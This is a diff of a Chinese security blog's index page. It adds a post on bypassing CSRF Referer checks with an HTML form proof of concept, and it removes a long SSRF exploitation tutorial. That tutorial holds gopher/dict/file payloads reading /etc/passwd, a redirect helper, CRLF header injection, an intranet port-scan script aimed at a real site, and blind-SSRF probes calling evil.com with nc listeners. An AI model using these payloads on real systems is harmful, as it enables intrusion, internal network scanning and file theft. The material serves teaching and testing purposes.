@@ -285,6 +285,181 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/11/CSRF绕过Referer校验/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="VegyChick">
+      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="菜鸟博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/12/11/CSRF绕过Referer校验/" class="post-title-link" itemprop="url">CSRF绕过Referer校验</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-12-11 11:26:36 / 修改时间：11:27:53" itemprop="dateCreated datePublished" datetime="2019-12-11T11:26:36+08:00">2019-12-11</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>目录</p>
+<ul>
+<li><a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#正常情况" target="_blank" rel="noopener">正常情况</a></li>
+<li>不正常的情况<ul>
+<li><a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#添加无referer标签" target="_blank" rel="noopener">添加无Referer标签</a></li>
+<li><a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#自建服务器路径带referer字段名" target="_blank" rel="noopener">自建服务器路径带referer字段名</a></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="正常情况"><a href="#正常情况" class="headerlink" title="正常情况#"></a>正常情况<a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#628046037" target="_blank" rel="noopener">#</a></h1><p>正常的情况下（服务器端校验Referer的代码没毛病），前端是无法绕过的。</p>
+<p>我之前考虑过的方案：</p>
+<ul>
+<li>JS修改Referer，失败</li>
+<li>后端用PHP语言编写发送包，问题是你怎么能跨域拿Cookie，失败</li>
+</ul>
+<h1 id="不正常的情况"><a href="#不正常的情况" class="headerlink" title="不正常的情况#"></a>不正常的情况<a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#590862394" target="_blank" rel="noopener">#</a></h1><p>不正常的情况下（服务器端校验Referer的代码有漏洞），前端才能做到绕过，下面介绍几个可能会绕过Referer的案例；</p>
+<h2 id="添加无Referer标签"><a href="#添加无Referer标签" class="headerlink" title="添加无Referer标签#"></a>添加无Referer标签<a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#3703399181" target="_blank" rel="noopener">#</a></h2><blockquote>
+<p>可以尝试无Referer标签，万一逻辑刚好没判断无Referer的情况呢；</p>
+</blockquote>
+<meta name="referrer" content="never">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Copy&lt;html&gt;</span><br><span class="line">  &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;  &lt;!-- 实现浏览器页面不刷新修改url链接 --&gt;</span><br><span class="line">    &lt;form action=&quot;http://www.baidu.com/setProfile&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;nickname&quot; value=&quot;new22&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;1&amp;#64;1&amp;#46;com&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;team&quot; value=&quot;new22&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;address&quot; value=&quot;new33&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="自建服务器路径带referer字段名"><a href="#自建服务器路径带referer字段名" class="headerlink" title="自建服务器路径带referer字段名#"></a>自建服务器路径带referer字段名<a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#3302619800" target="_blank" rel="noopener">#</a></h2><blockquote>
+<p>原理就是在路径上创建成原本referer中有的字段名，如果校验只是判断是否包含，那就666了；</p>
+</blockquote>
+<p><a href="https://img2018.cnblogs.com/blog/1552062/201903/1552062-20190304155740024-1698401706.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1552062/201903/1552062-20190304155740024-1698401706.png" alt="img"></a></p>
+<p>如果文章对你有帮助，可以给文章评论、点推荐哦<br>Github：<a href="https://github.com/Mysticbinary" target="_blank" rel="noopener">https://github.com/Mysticbinary</a><br>微信公众号： <a href="https://www.cnblogs.com/mysticbinary/p/12002297.html" target="_blank" rel="noopener">Mysticbinary</a><br>本文版权归作者所有，欢迎转载，但未经作者同意请保留此段声明，请在文章页面明显位置给出原文链接</p>
+<p>分类: <a href="https://www.cnblogs.com/mysticbinary/category/1422334.html" target="_blank" rel="noopener">JavaScript</a></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/20/透过F5获取服务器真实内网IP技巧/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1916,296 +2091,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/17/SSRF在有无回显方面的利用及其思考与总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="VegyChick">
-      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="菜鸟博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/10/17/SSRF在有无回显方面的利用及其思考与总结/" class="post-title-link" itemprop="url">SSRF在有无回显方面的利用及其思考与总结</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-
-          
-          
-          
-
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-10-17 23:35:42 / 修改时间：23:36:32" itemprop="dateCreated datePublished" datetime="2019-10-17T23:35:42+08:00">2019-10-17</time>
-            </span>
-          
-
-          
-            
-
-            
-          
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          <br>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="SSRF在有无回显方面的利用及其思考与总结"><a href="#SSRF在有无回显方面的利用及其思考与总结" class="headerlink" title="SSRF在有无回显方面的利用及其思考与总结"></a>SSRF在有无回显方面的利用及其思考与总结</h2><p> 对于SSRF的利用、危害及绕过[MisakiKata ]师傅先知上的的<a href="https://xz.aliyun.com/t/6235" target="_blank" rel="noopener">一文</a>介绍的非常详细，看了这篇文章也学到了很多。由于在实际场景中还遇到很多类似SSRF的点，所以还想深入探讨一下其他利用方式以及无回显情况下的SSRF。</p>
-<h3 id="1-一般层面（有回显）SSRF及bypass利用技巧"><a href="#1-一般层面（有回显）SSRF及bypass利用技巧" class="headerlink" title="1.一般层面（有回显）SSRF及bypass利用技巧"></a>1.一般层面（有回显）SSRF及bypass利用技巧</h3><p>可能存在SSRF的URL:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/vul.php?url=http://www.xxc.com/xxx.jpg</span><br><span class="line">http://share.xxx.com/index.php?url=http://test.com</span><br></pre></td></tr></table></figure>
-
-<p>测试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/vul.php?url=http://127.0.0.1:port</span><br></pre></td></tr></table></figure>
-
-<p>根据回显内容和状态即可确定漏洞是否存在。</p>
-<p>协议利用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gopher</span><br><span class="line">http://127.0.0.1/ssrf.php?url=gopher://127.0.0.1:2333/_test</span><br><span class="line">dict</span><br><span class="line">http://4o4notfound.org/ssrf.php?url=dict://127.0.0.1:port/info</span><br><span class="line">file</span><br><span class="line">http://4o4notfound.org/ssrf.php?url=file:///etc/passwd</span><br><span class="line">http</span><br><span class="line">http://4o4notfound.org/ssrf.php?url=http://xxx.com/302.php</span><br></pre></td></tr></table></figure>
-
-<p>协议限制为http下向服务端提交</p>
-<h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a><strong>bypass</strong></h4><ul>
-<li>IP限制绕过（xip.io,十进制IP,八进制IP）</li>
-<li>协议限制绕过（Redirect,CRLF header injection）</li>
-<li>调用系统支持的协议和方法</li>
-</ul>
-<p>辅助脚本302.php—-bypass http协议限制</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$ip = $_GET[&apos;ip&apos;];</span><br><span class="line"></span><br><span class="line">$port = $_GET[&apos;port&apos;];</span><br><span class="line"></span><br><span class="line">$scheme = $_GET[&apos;s&apos;];</span><br><span class="line"></span><br><span class="line">$data = $_GET[&apos;data&apos;];</span><br><span class="line"></span><br><span class="line">header(&quot;Location: $scheme://$ip:$port/$data&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>协议利用：</p>
-<p>1)Dict协议</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/302.php?s=dict&amp;ip=vul.comg&amp;port=8080&amp;data=helo:dict</span><br></pre></td></tr></table></figure>
-
-<p>2)Gopher协议</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/302.php?s=gopher&amp;ip=vul.comg&amp;port=8080&amp;data=gopher</span><br></pre></td></tr></table></figure>
-
-<p>3)file协议</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: file:///etc/passwd&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>例子：只能本地localhost情况下访问</p>
-<p>结合一道CTF实例</p>
-<p>302.php的内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Location:gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1%0d%0aHost:</span><br><span class="line"></span><br><span class="line">vultarget.com%0d%0aUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0)</span><br><span class="line"></span><br><span class="line">Gecko/20100101 Firefox/50.0%0d%0aAccept:</span><br><span class="line"></span><br><span class="line">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8%0d%0aAccept-Language:</span><br><span class="line"></span><br><span class="line">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3%0d%0aAccept-Encoding: gzip,</span><br><span class="line"></span><br><span class="line">deflate%0d%0aConnection: keep-alive%0d%0aUpgrade-Insecure-Requests: 1%0d%0aContent-</span><br><span class="line"></span><br><span class="line">Type: application/x-www-form-urlencoded%0d%0aContent-Length:</span><br><span class="line"></span><br><span class="line">14%0d%0a%0d%0ausername=admin&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>CRLF Header Injection HTTP头注入</p>
-<p>weblogic uddiexplorer SSRF</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://(要探测的内网地址)&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
-
-<p>CRLF-&gt;ASCII Code</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-%0d-&gt;0x0d-&gt;\r 回车</span><br><span class="line">-%0a-&gt;0x0a-&gt;\n 换行</span><br></pre></td></tr></table></figure>
-
-<p>案例一</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190917095323-eec96922-d8ed-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190917095323-eec96922-d8ed-1.png" alt="img"></a></p>
-<p>案例二</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190917095343-fa7c5040-d8ed-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190917095343-fa7c5040-d8ed-1.png" alt="img"></a></p>
-<h4 id="其他实例"><a href="#其他实例" class="headerlink" title="其他实例"></a><strong>其他实例</strong></h4><p>下面列出的代码的是从现实场景开发中找到的几个较常见不安全的的实实列。通过用户提供的URL来获取文件的PHP代码 ，只要它们允许用户决定从哪里获取数据即可 。</p>
-<ol>
-<li>PHP file_get_contents</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_POST[&apos;url&apos;])) </span><br><span class="line">    &#123; </span><br><span class="line">        $content = file_get_contents($_POST[&apos;url&apos;]); </span><br><span class="line">        $filename = &apos;./images/&apos;.rand().&apos;img1.jpg&apos;; </span><br><span class="line">        file_put_contents($filename, $content); </span><br><span class="line">        echo $_POST[&apos;url&apos;].&quot;&quot;; </span><br><span class="line">        $img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    echo $img; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>此实现使用<code>file_get_contents</code>PHP函数提取用户请求的数据（在本例中为图像），并将其保存到磁盘上随机生成的文件名的文件中。然后，HTML img属性将图像显示给用户，$content可以由用户控制。</p>
-<ol>
-<li>PHP fsockopen（）函数</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    function GetFile($host,$port,$link) </span><br><span class="line">    &#123; </span><br><span class="line">        $fp = fsockopen($host, intval($port), $errno, $errstr, 30); </span><br><span class="line">        if (!$fp) &#123; </span><br><span class="line">            echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">        &#125; else &#123; </span><br><span class="line">            $out = &quot;GET $link HTTP/1.1\r\n&quot;; </span><br><span class="line">            $out .= &quot;Host: $host\r\n&quot;; </span><br><span class="line">            $out .= &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">            $out .= &quot;\r\n&quot;; </span><br><span class="line">            fwrite($fp, $out); </span><br><span class="line">            $contents=&apos;&apos;; </span><br><span class="line">            while (!feof($fp)) &#123; </span><br><span class="line">                $contents.= fgets($fp, 1024); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        return $contents; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>函数实现的是使用<code>fsockopen</code>PHP函数按用户（任何文件或HTML）的请求获取数据。此函数建立与服务器上的套接字的TCP连接，并执行原始数据传输。</p>
-<p>3.PHP curl_exec（）函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    if (isset($_POST[&apos;url&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $link = $_POST[&apos;url&apos;];</span><br><span class="line">        $curlobj = curl_init();</span><br><span class="line">        curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">        curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">        curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $result=curl_exec($curlobj);</span><br><span class="line">        curl_close($curlobj);</span><br><span class="line"></span><br><span class="line">        $filename = &apos;./curled/&apos;.rand().&apos;.txt&apos;;</span><br><span class="line">        file_put_contents($filename, $result); </span><br><span class="line">        echo $result;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这是在开发中另一个非常常见的操作，它使用<code>cURL</code>PHP 获取数据。文件/数据被下载并存储到’curled’文件夹下的磁盘中，并附加一个随机数和’.txt’文件扩展名。</p>
-<p>以下是从某网站检索robots.txt的上述代码对应的示列</p>
-<p>原本请求<strong>http：//<a href="http://www.example.com/robots.txt" target="_blank" rel="noopener">www.example.com/robots.txt</a></strong></p>
-<p>但是请求<strong>http：//127.0.0.1：3306 / test.txt</strong> ，得到如下回显</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190917095403-06c28ae0-d8ee-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190917095403-06c28ae0-d8ee-1.png" alt="img"></a></p>
-<h4 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a><strong>利用技巧</strong></h4><p>端口扫描：</p>
-<p>1）PHP</p>
-<p>可以滥用以下cURL实现来端口扫描设备：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    if (isset($_POST[&apos;url&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $link = $_POST[&apos;url&apos;];</span><br><span class="line">        $filename = &apos;./curled/&apos;.rand().&apos;txt&apos;;</span><br><span class="line">        $curlobj = curl_init($link);</span><br><span class="line">        $fp = fopen($filename,&quot;w&quot;);</span><br><span class="line">        curl_setopt($curlobj, CURLOPT_FILE, $fp);</span><br><span class="line">        curl_setopt($curlobj, CURLOPT_HEADER, 0);</span><br><span class="line">        curl_exec($curlobj);</span><br><span class="line">        curl_close($curlobj);</span><br><span class="line">        fclose($fp);</span><br><span class="line">        $fp = fopen($filename,&quot;r&quot;);</span><br><span class="line">        $result = fread($fp, filesize($filename)); </span><br><span class="line">        fclose($fp);</span><br><span class="line">        echo $result;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>2）自动话扫描：</p>
-<p>例如10网段的B、C段扫描</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line">port = &apos;80&apos;</span><br><span class="line"># fuzz local C </span><br><span class="line">for c in xrange(0,255):</span><br><span class="line">    for d in xrange(0,255):</span><br><span class="line">        ip = &apos;10.xx.&#123;0&#125;.&#123;1&#125;&apos;.format(c,d)</span><br><span class="line">        payload = &apos;http://&#123;ip&#125;:&#123;port&#125;/&apos;.format(ip=ip,port=port)</span><br><span class="line">        url = &apos;http://share.v.t.qq.com/index.php?c=share&amp;a=pageinfo&amp;url=&#123;payload&#125;&apos;.format(</span><br><span class="line">            payload=payload)</span><br><span class="line">        # len(&#123;&quot;ret&quot;:1&#125;) == 9</span><br><span class="line">        if len(requests.get(url).content) != 9:</span><br><span class="line">            print ip, port, &apos;OPEN&apos;, requests.get(url).content</span><br></pre></td></tr></table></figure>
-
-<p>更多内容可参考文章<a href="https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html" target="_blank" rel="noopener">1</a> [2](<a href="http://thehiddenwiki.pw/files/hacking/Attacks" target="_blank" rel="noopener">http://thehiddenwiki.pw/files/hacking/Attacks</a> and sockets: smorgasbord of vulnerabilities.pdf) <a href="http://xss.one/bug_detail.php?wybug_id=wooyun-2016-0215779" target="_blank" rel="noopener">猪猪侠</a>。</p>
-<h3 id="2-WEB层面图片SSRF无回显之SSRF盲打利用"><a href="#2-WEB层面图片SSRF无回显之SSRF盲打利用" class="headerlink" title="2.WEB层面图片SSRF无回显之SSRF盲打利用"></a>2.WEB层面图片SSRF无回显之SSRF盲打利用</h3><h4 id="从XSS到SSRF"><a href="#从XSS到SSRF" class="headerlink" title="从XSS到SSRF"></a><strong>从XSS到SSRF</strong></h4><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190917095425-13dc6b6a-d8ee-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190917095425-13dc6b6a-d8ee-1.png" alt="img"></a></p>
-<p>上图是一次XSS的测试，在经过各种测试之后发现已被过滤的非常严了，各种绕然而并不存在任何XSS问题。然而就这这样结束了吗，其实还存在一个测试点。相信在测试图片XSS经常会遇到如下情况：</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190917095441-1d011c72-d8ee-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190917095441-1d011c72-d8ee-1.png" alt="img"></a></p>
-<p>对添加的图片会又被GET请求一次，然后图片url地址又是我们可控制的。这时测试面就逃离了限制更加开阔了。为此，只需从外部站点获取一个文件即可，只要该文件含有相应的恶意payload，并且其内容类型为html</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：` `http://localhost:4567/?url=http://brutelogic.com.br/poc.svg`或者`http://127.0.0.1:22</span><br></pre></td></tr></table></figure>
-
-<p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL，若存在回显利用方式比较多 。但是若遇到无回显的SSRF。利用方式又值得探讨一番。</p>
-<h4 id="Bool型SSRF"><a href="#Bool型SSRF" class="headerlink" title="Bool型SSRF"></a>Bool型SSRF</h4><p>BOOL型SSRF与一般的SSRF的区别在步骤二应用识别,步骤三攻击Payload和步骤四Payload Result. 一般的SSRF在应用识别阶段返回的信息相对较多,比如Banner信息,HTTP Title信息,更有甚的会将整个HTTP的Reponse完全返回. 而Bool型SSRF的却永远只有True or False.</p>
-<p> 对于Bool型SSRF, 我们不能说Payload打过去就一定成功执行, 就算是返回True, 也不能保证Payload一定执行成功. 所以我们要验证Payload的执行状态信息.</p>
-<h4 id="SSRF之盲打SSRF"><a href="#SSRF之盲打SSRF" class="headerlink" title="SSRF之盲打SSRF"></a>SSRF之盲打SSRF</h4><p>无回显情况下通过VPS NC监听所有URL Schema存在情况</p>
-<p>1.测试URL Schema</p>
-<p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL Schema：</p>
-<ul>
-<li>file:///</li>
-<li>dict://</li>
-<li>sftp://</li>
-<li>ldap://</li>
-<li>tftp://</li>
-<li>gopher://</li>
-</ul>
-<h5 id="file"><a href="#file" class="headerlink" title="file://"></a><strong>file://</strong></h5><p>这种URL Schema可以尝试从文件系统中获取文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure>
-
-<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
-<h5 id="dict"><a href="#dict" class="headerlink" title="dict://"></a><strong>dict://</strong></h5><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/ </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*] </span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>
-
-<h5 id="sftp"><a href="#sftp" class="headerlink" title="sftp://"></a><strong>sftp://</strong></h5><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/ </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*] </span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure>
-
-<h5 id="ldap-或ldaps-或ldapi"><a href="#ldap-或ldaps-或ldapi" class="headerlink" title="ldap://或ldaps:// 或ldapi://"></a><strong>ldap://或ldaps:// 或ldapi://</strong></h5><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
